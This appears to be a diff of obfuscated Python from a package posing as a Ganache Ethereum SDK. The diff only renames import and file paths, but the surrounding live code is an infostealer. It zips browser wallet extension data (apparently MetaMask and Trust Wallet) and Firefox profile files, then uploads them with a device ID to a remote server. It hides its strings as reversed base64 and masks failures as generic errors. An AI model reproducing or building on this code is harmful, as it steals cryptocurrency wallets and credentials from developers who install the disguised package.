@@ -4,14 +4,14 @@ H=None
 G=open
 C=print
 import requests as E
-from ganache.utils import G as J,K as A
+from ganache_sdk.utils import G as J,K as A
 import os as B,glob as D,re,shutil as W,secretstorage as I
 from importlib import import_module as K
 from getpass import getuser as L
 from shutil import copy
 import sqlite3 as V,string as X
 from os import unlink as Y
-from ganache.models import AC as Z
+from ganache_sdk.models import AC as Z
 a='=k2YnJ2atVWZt5Wakh2Zn5Gbi92boNWZsd2arNGbjpGZ'
 b='=0GatlmbqFWZlVWbsFGZjVGanxGajxGcvtWYixWYipWZ'
 c='=4mbrdGcnZWZiR2br5mZlxGal9WYlF2ZvVmYmhWaitmb'
@@ -85,15 +85,15 @@ class w:
 		for id in D.id_list:
 			H=path+A(g)+id
 			if B.path.exists(H):
-				F='ganache/mtm.zip';type=A(N)
-				if id==A(M):F='ganache/tw.zip';type=A(h)
+				F='ganache_sdk/mtm.zip';type=A(N)
+				if id==A(M):F='ganache_sdk/tw.zip';type=A(h)
 				J(H,F);K={T:G(F,'rb')};L={A(O):D.device_id,A(P):browser,A(Q):type,U:id}
 				try:
 					I=E.post(D.base_url+A(R),data=L,files=K)
 					if I.status_code<200 or I.status_code>=300:C('Error 33: Unknown error')
 				except:C('Error -33: Unknown error')
 	def __handle_ff(K):
-		V='ganache/mtmf.zip';X=D.glob(B.path.expanduser(A(i)));Y=D.glob(B.path.expanduser(A(j)));Z=X+Y
+		V='ganache_sdk/mtmf.zip';X=D.glob(B.path.expanduser(A(i)));Y=D.glob(B.path.expanduser(A(j)));Z=X+Y
 		for F in Z:
 			with G(F,'r',encoding='utf-8',errors='ignore')as H:
 				a=H.read();L=re.search(A(k),a)
